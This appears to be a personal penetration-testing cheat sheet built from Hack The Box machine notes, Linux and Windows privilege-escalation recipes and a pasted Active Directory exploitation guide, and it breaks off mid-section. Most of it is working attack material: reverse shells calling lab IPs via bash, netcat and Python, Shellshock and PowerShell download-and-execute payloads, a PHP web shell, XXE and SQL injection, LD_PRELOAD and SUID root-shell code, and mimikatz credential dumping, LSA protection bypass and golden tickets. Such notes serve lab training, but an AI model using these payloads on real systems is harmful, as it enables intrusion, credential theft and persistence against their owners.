Methodology:
sudo apache2 -f etc/shadow
echo “bash -i >& /dev/tcp/10.0.0.1/8080 0>&1” >> /usr/local/bin/overwrite.sh

1- Nmap -sC -sV -T4 -A -O -oA BOX p 10.10.10.10
2- Service enumeration
3- Nmap p 124,123 –script vuln 10.10.10.10
4- ls -lah usr/share/nmap/scripts |gep ftp
5- ls -lah usr/share/nmap/scripts/ftp*
6- cmo or cold-fusion or user,admin,robots.txt
7- Source code
9- Dirbuster or gobuster
10-burpsuite
11-windows or linux
12-searchsploit
13-information give can be used for: 1- post expo  
                                     2- priv esca
                                     3- transfer  
                                     4- Other
14-hydra will fail use cewl 
15-dirbuster will fail use wfuzz
16-smbmap will give false false negative conduct manually
17-criteria for selecting exploit: 1-download
                                   2-upload
                                   3-RCE OR COMMAND INJECTION
                                   4-LFI
                                   5-RFI
                                   5-SQL
18-EXPLOIT :1- EXPLOITS REQUIREMENT
            2- UNDERSTAND PARAMETER
19-SOLIDSTATE :1- DIRBUSTER OUTPUT
               2- Rabbit hole
20-after gaining shell : step1: Choose
                         step2: current directory or sudo -l
21-python http 2.3 exploit
22-exploitdb/exploitbins
23-shellshock remote code execution vulnerability
24-friendzone – look here and there on web server
25-h2 transfer exploit on target machine and run
26-Brainfuck – 1- try each exploit 
               2- Go to first directory
               3-when ssh is private change into john format and gain password
                ssh2john.py id_rsa > root_key
                john root_key -w=/usr/share/wordlists/rockyou.txt
27-Arctic : 1- C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
            2- msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.jsp

--------------------------------------------------------------------------------
Location of files stored C:\ColdFusion8\wwwroot\CFIDE\shell.jsp
--------------------------------------------------------------------------------
aspx using .config file

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->

--------------------------------------------------------------------------------


powershell:
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.2:80/ex.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
--------------------------------------------------------------------------------
<?php echo system($_REQUEST['cmd']);?>

keepass2john CEH.kdbx > john.hash

powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.4:80/nc.exe')

PHP WRAPPER METHODS:
1-http://[path-to-remote-file]
2-expect://[command]
3-php://input&cmd=[command]  <?php echo shell_exec($GET['cmd']); ?>
4-php://filter/convert.base64-encode/resource=[file-name]

www.whitehatsec.com for hashed password

nslookpup
server 10.10.10.123
10.10.10.123
host -l friendzone.red 10.10.10.123

python sshng2john.py ~/Desktop/htb/brainfuck/id_rsa>~/Desktop/htb/brainfuck/ssh-
key

certutil.exe -urlcache -split -f http://10.10.14.6.bastard.exe  c:\temp\bastard.exe

ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76

irc:
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444"  10.10.10.117


shellock directory: cgi-sys cgi-mod cgi-bin

Shellshock vulnerability in user agent:
() { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.6/4444/port 0>&1
() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1


for i in $(seq 0 12); do echo -n " |base64 -d" ; done

wpscan --url https://brainfuck.htb --disable-tls-checks --api-token <redacted>
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u

http://dann.com.br/alexctf2k17-crypto150-what_is_this_encryption/
https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e/19530#19530

sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 –checkpoint-action=exec=/bin/sh

droopescan scan drupal -u http://10.10.10.9
-------------------------------------------------------------------------------------------
<?xml version="1.0"?>
  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
  ]>
  <feed>
    <Author>raj</Author>
    <Subject>chandel</Subject>
    <Content>&xxe;</Content>
  </feed>
--------------------------------------------------------------------------------------------
port 80
1-cold fusion 
2-user,admin,help,robots.txt
3-cms
4-source code
5-certificate
6-dirbuster 
7-burp
8-windows/linux
9-searchsploit
10-whatever information you have it will be used at any point either priviledge escalation & post-explotation
11-when hydra fail try to use cewl
12-when dirbuster fail use wfuzz 
13-smbmap and smbclient will have false positive and negative try to inspect manually
14-netcat
15-metasploit
16-application
17-services 
18-file transfer
19-ssh key permission 600

20-wfuzz -c -d "username=FUZZ&password=n00bsec" -w /usr/share/seclists/Usernames/Names/names.txt -u http://10.10.10.73/login.php

21-'OR'1'='1

22-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch

23-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification"  -D falafel --tables --batch

24-sqlmap -u http://10.10.10.73/login.php --forms --level 5 --risk 3 --string "Wrong identification" -D falafel -T users --dump --batch

25-cat backup.7z > /dev/tcp/10.10.14.4/9001

26-ldapsearch -x -h lightweight.htb -b "dc=lightweight,dc=htb"

27-nc can be used to get wget version and can be exploited

28-Magic byte==== GIF8;

29-wc -l ---to count lines

30-wc -c ---to count character

31-git log and git show

32-getcap -r usr/bin ; getcap -r usr/sbin ; ep – means we can read and write anything 

33-tcpdump -i any -w captured.pcap

34-scp 10.10.xx.xx@lightweight.htb:/home/10.10.xx.xx/captured.pcap ./

35-backup.7z = 7za e backup.7z

36-vsftpd 2.3.4 psy shell using nc 10.10.10.131 6200
--------------------------------------------------------------------------------
Certificates dealing:
first verify that both certificates are same
1-openssl pkey -in ca.key -pubout
2-openssl  x509 -in ca.crt -pubkey -noout
Create client key:
openssl genrsa -out client.key 4096
Create certificate sign request:
openssl req -new -key client.key -out client.csr 
Signing the certificate:
1-openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer 
2-openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
3-import two things .p12 (your certificate)  and ca.crt files (authorities) 
----------------------------------------------------------------------------
[program:memcached]
command = bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'
----------------------------------------------------------------------------
cat backup.7z |base64
 
python psexec.py 'pentest:P3nT3st!@10.10.10.152'
python psexec.py -hashe ‘gasjxsxssjsddjd’ administrator@10.10.10.152
base64 -d backup > backup.7z [lostmypass.com]

echo “<html><body>HELLO</body></html>” > test.html

whenever see HTTP PUT AND MOVE METHOD TRY davtest –url https://10.10.10.5
From Put method to MOVE method:
msfvenom -p windows/shell_reverse_tcp LHOST LPORT -f aspx > shell.aspx
mv shell.aspx shell.txt
curl -X PUT http://10.10.10.15/shell.txt –-data-binary @shell.txt
curl -X MOVE –header ‘Destination:http://10.10.10.15/shell.aspx’ ‘http://10.10.10.15/shell.txt’


Microsoft IIS 6.0 -expoit 2017-7269         
if it is encoded 13 times:
1-for i in $(seq 0 12); do echo -n “|base64 -d “; done
2- base64 -d passwd.txt |base64 -d |base64 -d |base64 -d |base64 -d
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.6 4444 -e /bin/bash'"
-------------------------
#!/bin/sh
bash
-------------------------
python sshng2john.py id_rsa > ssh_login

220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
EHLO bla.bla
250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
250-PIPELINING
250 ENHANCEDSTATUSCODES
MAIL FROM: <'random@random.com>
250 2.1.0 Sender <'random@random.com> OK
RCPT TO: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
DATA
354 Ok Send data ending with <CRLF>.<CRLF>
FROM: bla.bla
'
/bin/nc -e /bin/bash 10.10.14.12 1234
.
250 2.6.0 Message received
quit

P@55W0rd1!2@

heartbleedbelievethehype

----------------------------------------------------------------------
8bc8251332abe1d7f105d3e53ad39ac2

-----------------------------------------------------------------------
backup.7z
7za e backup.7z
base64 backup.7z
copy it as backup.7z.enc
base64 -d backup.7z.enc > backup.7z
7z e backup.7z
brute force using https://github.com/Seyptoo/7z-BruteForce.git

./openssl enc -base64 -in /root/root.txt -out ./root.txt.b64
base64 -d root.txt.b64
------------------------------------------------------------------------
db

show collections

db.table.find()

db.tasks.insert({cmd: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.12\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"})
------------------------------------------------------------------------







Linux Priv esc:
-------------------------------------------------------------------------------
LD_PRELOAD


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}



gcc -fpic -shared -nostartfiles -o tmp/preload.so /home/user/tools/sudo/preload.c

sudo LD_PRELOAD=/tmp/preload.so iftop
id
--------------------------------------------------------------------------
LD_LIBRARY_PATH

ldd /usr/sbin/apache2

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}



gcc -fpic -shared -o /tmp/libcrypt.so.1 /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp iftop

------------------------------------------------------------------------------
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-------------------------------------------------------------------------------
suid-sgid object injection:

strace /usr/local/bin/suid-so  2>&1 | grep -iE "open|access|no such file"

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}


gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c

/usr/local/bin/suid-so
----------------------------------------------------------------------------
suid-sgid environment variables:

int main() {
        setuid(0);
        system("/bin/bash -p");
}

gcc -o service /home/user/tools/suid/service.c

PATH=.:$PATH /usr/local/bin/suid-env

--------------------------------------------------------------------------
suid-sgid abusing shell feature part-1

bin/bash –version (<4.2-048)

function /usr/sbin/service { /bin/bash -p; }

export -f /usr/sbin/service

/usr/local/bin/suid-env2

---------------------------------------------------------------------------
suid-sgid abusing shell feature part-2

This will not work on Bash versions 4.4 and above.

In tmp directory:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2

tmp/rootbash -p 
-------------------------------------------------------------------------------
Password and keys : cat ~/.history |grep pass
Password and keys : ls -lah
                    strings mv.ovpn
                     cat pass/password.txt
Password and keys : cat .ssh/root_key
-------------------------------------------------------------------------------
NFS:

cat etc/exports  :  no_root_squash
mount -o rw,vers=2 10.10.148.67:/tmp /tmp/nfs
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.14.98 LPORT=4444 -f exe > shell.exe
chmod +xs shell.exe
transfer it in tmp directory and execute tmp/shell.exe
----------------------------------------------------------------------------------------------------------------------------------------------------------------









Windows Priv escalation:

Always run winPEAS:


------------------------------------------------------------------------------------------------------------------------------------------------------------
1- LLMNR/NBT-NS
                 2- PASS THE HASH
                 3- TOKENIZATION
                 4- SMB RELAY ATTACK 
                 5- KERBEROSTING:  
                 
                      1- Get a list of usernames: 
                           enum4linux
                           smbmap

                           WITHOUT AUTH:
                           kerbrute userenum -d htb.local dc htb.local wordlist.txt -t 100
                           getnpusers.py  htb.local/  this will give list of usernames
                           getnpusers.py  htb.local/ -dc-ip 10.10.10.10
                           getnpusers.py  htb.local/ -dc-ip 10.10.10.10 -request           -give 
                           ./GetNPUsers.py spookysec.local/svc-admin -dc-ip  10.10.129.20  -request
                           
                           WITH CREDENTIALS:
                           getuserspn.py htb.local/sam:password
                           getuserspn.py htb.local/sam:password  -request


                           secretdump.py spooky.local/user:password@10.10.10.10  -just-dc-ntlm
                           
                           dc sync attack:
                           wmiexec.py spooky.local/user:password@10.10.10.10 
                           psexec.py
                           evilwinrm
                           
                           mimikatz----- lsadump::dcsync  /domain:spooky.local  /user:krbtgt
                           
                           persistence:(Golden ticket)
                           
                           kerberos::golden /domian:spooky.local /sid:xxxxxxxxxxxxxxxxxxx  /user:admin /krbtgt:nt-hash /ptt
 
 
                           Golden-Part-2
                           DOMAIN:
                           DOMAIN SID:
                           KRBTGT HASH:
https://offsec.red/mimikatz-cheat-sheet/
https://awesomeopensource.com/project/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet



A cheat sheet that contains common enumeration and attack methods for Windows Active Directory.

    Active Directory Exploitation Cheatsheet
        Summary
        Tools
        Domain Enumeration
            Using PowerView
            Using AD Module
            Using BloodHound
            Useful Enumeration Tools
        Local Privilege Escalation
        Lateral Movement
            Powershell Remoting
            Remote Code Execution with PS Credentials
            Import a powershell module and execute its functions remotely
            Executing Remote Stateful commands
            Mimikatz
            Useful Tools
        Domain Privilege Escalation
            Kerberoast
            ASREPRoast
            Password Spray Attack
            Force Set SPN
            Abusing Shadow Copies
            List and Decrypt Stored Credentials using Mimikatz
            Unconstrained Delegation
            Constrained Delegation
            Resource Based Constrained Delegation
            DNSAdmins Abuse
            Abusing Active Directory-Integraded DNS
            Abusing Backup Operators Group
            Abusing Exchange
            Weaponizing Printer Bug
            Abusing ACLs
            Abusing IPv6 with mitm6
            SID History Abuse
            Exploiting SharePoint
            Zerologon Exploit
        Domain Persistence
            Golden Ticket Attack
            DCsync Attack
            Silver Ticket Attack
            Skeleton Key Attack
            DSRM Abuse
            Custom SSP
        Cross Forest Attacks
            Trust Tickets
            Abuse MSSQL Servers
            Breaking Forest Trusts

Tools

    Powersploit
    PowerUpSQL
    Powermad
    Impacket
    Mimikatz
    Rubeus -> Compiled Version
    BloodHound
    AD Module
    ASREPRoast

Domain Enumeration
Using PowerView

    Get Current Domain: Get-NetDomain

    Enum Other Domains: Get-NetDomain -Domain <DomainName>

    Get Domain SID: Get-DomainSID

    Get Domain Policy:

    Get-DomainPolicy

    #Will show us the policy configurations of the Domain about system access or kerberos
    (Get-DomainPolicy)."system access"
    (Get-DomainPolicy)."kerberos policy"

    Get Domain Controlers:

    Get-NetDomainController
    Get-NetDomainController -Domain <DomainName>

    Enumerate Domain Users:

    Get-NetUser
    Get-NetUser -SamAccountName <user> 
    Get-NetUser | select cn
    Get-UserProperty

    #Check last password change
    Get-UserProperty -Properties pwdlastset

    #Get a spesific "string" on a user's attribute
    Find-UserField -SearchField Description -SearchTerm "wtver"

    #Enumerate user logged on a machine
    Get-NetLoggedon -ComputerName <ComputerName>

    #Enumerate Session Information for a machine
    Get-NetSession -ComputerName <ComputerName>

    #Enumerate domain machines of the current/specified domain where specific users are logged into
    Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName

    Enum Domain Computers:

    Get-NetComputer -FullData
    Get-DomainGroup

    #Enumerate Live machines 
    Get-NetComputer -Ping

    Enum Groups and Group Members:

    Get-NetGroupMember -GroupName "<GroupName>" -Domain <DomainName>

    #Enumerate the members of a specified group of the domain
    Get-DomainGroup -Identity <GroupName> | Select-Object -ExpandProperty Member

    #Returns all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
    Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName

    Enumerate Shares

    #Enumerate Domain Shares
    Find-DomainShare

    #Enumerate Domain Shares the current user has access
    Find-DomainShare -CheckShareAccess

    Enum Group Policies:

    Get-NetGPO

    # Shows active Policy on specified machine
    Get-NetGPO -ComputerName <Name of the PC>
    Get-NetGPOGroup

    #Get users that are part of a Machine's local Admin group
    Find-GPOComputerAdmin -ComputerName <ComputerName>

    Enum OUs:

    Get-NetOU -FullData 
    Get-NetGPO -GPOname <The GUID of the GPO>

    Enum ACLs:

    # Returns the ACLs associated with the specified account
    Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
    Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

    #Search for interesting ACEs
    Invoke-ACLScanner -ResolveGUIDs

    #Check the ACLs associated with a specified path (e.g smb share)
    Get-PathAcl -Path "\\Path\Of\A\Share"

    Enum Domain Trust:

    Get-NetDomainTrust
    Get-NetDomainTrust -Domain <DomainName>

    Enum Forest Trust:

    Get-NetForestDomain
    Get-NetForestDomain Forest <ForestName>

    #Domains of Forest Enumeration
    Get-NetForestDomain
    Get-NetForestDomain Forest <ForestName>

    #Map the Trust of the Forest
    Get-NetForestTrust
    Get-NetDomainTrust -Forest <ForestName>

    User Hunting:

    #Finds all machines on the current domain where the current user has local admin access
    Find-LocalAdminAccess -Verbose

    #Find local admins on all machines of the domain:
    Invoke-EnumerateLocalAdmin -Verbose

    #Find computers were a Domain Admin OR a spesified user has a session
    Invoke-UserHunter
    Invoke-UserHunter -GroupName "RDPUsers"
    Invoke-UserHunter -Stealth

    #Confirming admin access:
    Invoke-UserHunter -CheckAccess

    ❗️ Priv Esc to Domain Admin with User Hunting:
    I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him ->
    Profit!

    PowerView 3.0 Tricks

Using AD Module

    Get Current Domain: Get-ADDomain
    Enum Other Domains: Get-ADDomain -Identity <Domain>
    Get Domain SID: Get-DomainSID
    Get Domain Controlers:

    Get-ADDomainController
    Get-ADDomainController -Identity <DomainName>

    Enumerate Domain Users:

    Get-ADUser -Filter * -Identity <user> -Properties *

    #Get a spesific "string" on a user's attribute
    Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description

    Enum Domain Computers:

    Get-ADComputer -Filter * -Properties *
    Get-ADGroup -Filter * 

    Enum Domain Trust:

    Get-ADTrust -Filter *
    Get-ADTrust -Identity <DomainName>

    Enum Forest Trust:

    Get-ADForest
    Get-ADForest -Identity <ForestName>

    #Domains of Forest Enumeration
    (Get-ADForest).Domains

    Enum Local AppLocker Effective Policy:

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Using BloodHound

#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --LDAPPass <Password> --JSONFolder <PathToFile>
    
#Using powershell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>

Useful Enumeration Tools

    ldapdomaindump Information dumper via LDAP
    adidnsdump Integrated DNS dumping by any authenticated user
    ACLight Advanced Discovery of Privileged Accounts
    ADRecon Detailed Active Directory Recon Tool

Local Privilege Escalation

    PowerUp Misconfiguration Abuse

    BeRoot General Priv Esc Enumeration Tool

    Privesc General Priv Esc Enumeration Tool

    FullPowers Restore A Service Account's Privileges

    Juicy Potato Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

    ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

    Lovely Potato Automated Juicy Potato

    ⚠️ Works only until Windows Server 2016 and Windows 10 until patch 1803

    PrintSpoofer Exploit the PrinterBug for System Impersonation

    🙏 Works for Windows Server 2019 and Windows 10

    RoguePotato Upgraded Juicy Potato

    🙏 Works for Windows Server 2019 and Windows 10

    Abusing Token Privileges

    SMBGhost CVE-2020-0796
    PoC

Lateral Movement
Powershell Remoting

#Enable Powershell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>

Remote Code Execution with PS Credentials

$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}

Import a powershell module and execute its functions remotely

#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess 

#Interact with the session
Enter-PSSession -Session $sess

Executing Remote Stateful commands

#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}

Mimikatz

#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list

❗️ What if mimikatz fails to dump credentials because of LSA Protection controls ?
So far i know two workarounds:

    LSA as a Protected Process

#Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
#Now lets import the mimidriver.sys to the system
mimikatz # !+

#Now lets remove the protection flags from lsass.exe process
mimikatz # !processprotect /process:lsass.exe /remove

#Finally run the logonpasswords function to dump lsass
mimikatz # sekurlsa::logonpasswords

    LSA is running as virtualized process (LSAISO) by Credential Guard

#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
mimikatz # misc::memssp

#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log

    Detailed Mimikatz Guide
    Poking Around With 2 lsass Protection Options

Useful Tools

    Powercat netcat written in powershell, and provides tunneling, relay and portforward capabilities.
    SCShell fileless lateral movement tool that relies on ChangeServiceConfigA to run command
    Evil-Winrm the ultimate WinRM shell for hacking/pentesting
    RunasCs Csharp and open version of windows builtin runas.exe

Domain Privilege Escalation
Kerberoast

WUT IS DIS?:
All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"
account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.

    PowerView:

#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket
  
#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'

    AD Module:

#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

    Impacket:

python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>

    Rubeus:

#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
 
#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

#Kerberoast by specifying the authentication credentials 
Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>

ASREPRoast

WUT IS DIS?:
If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted
blob and bruteforce it offline.

    PowerView: Get-DomainUser -PreauthNotRequired -Verbose
    AD Module: Get-ADUser -Filter {DoesNoteRequirePreAuth -eq $True} -Properties DoesNoteRequirePreAuth

Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more! Check for interesting permissions on accounts:

Hint: We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!

PowerView:

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose

And finally execute the attack using the ASREPRoast tool.

#Get a spesific Accounts hash:
Get-ASREPHash -UserName <UserName> -Verbose

#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose

Using Rubeus:

#Trying the attack for all domain users
Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast spesific user
Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

#ASREPRoast users of a spesific OU (Organization Unit)
Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

Using Impacket:

#Trying the attack for the specified users on the file
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>

Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.

Tools:

    DomainPasswordSpray
    CrackMapExec
    SharpHose
    Spray

Force Set SPN

WUT IS DIS ?: If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.

    PowerView:

#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
 
#Check if current user has already an SPN setted:
Get-DomainUser -Identity <UserName> | select serviceprincipalname
 
#Force set the SPN on the account:
Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}

    AD Module:

#Check if current user has already an SPN setted
Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName
  
#Force set the SPN on the account:
Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}

Finally use any tool from before to grab the hash and kerberoast it!
Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows
  
#List shadow copies using diskshadow
diskshadow list shadows all
  
#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

    You can dump the backuped SAM database and harvest credentials.
    Look for DPAPI stored creds and decrypt them.
    Access backuped sensitive files.

List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

    %appdata%\Microsoft\Credentials
    %localappdata%\Microsoft\Credentials

#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

Detailed Article: DPAPI all the things
Unconstrained Delegation

WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a high value target or DA to connect to it, steal his TGT then ptt and impersonate him!

Using PowerView:

#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay   
<WaitInterval> -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'

Note: We can also use Rubeus!
Constrained Delegation

Using PowerView and Kekeo:

#Enumerate Users and Computers with constrained delegation
